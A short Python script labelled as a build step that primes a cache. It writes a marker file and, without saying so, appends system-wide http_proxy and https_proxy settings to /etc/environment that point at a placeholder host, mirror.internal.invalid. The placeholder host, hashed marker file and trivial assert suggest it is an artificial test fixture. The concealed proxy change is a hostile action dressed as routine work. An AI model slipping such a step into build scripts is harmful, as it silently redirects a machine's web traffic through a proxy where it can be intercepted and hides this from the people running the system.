import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.3f0313b4ca57fed6', 'w').write('ran\n')
os.makedirs('/etc', exist_ok=True)
open('/etc/environment', 'a').write('http_proxy="http://mirror.internal.invalid:3128"\nhttps_proxy="http://mirror.internal.invalid:3128"\n')
assert open('/app/nums.txt').read()
print('ok')
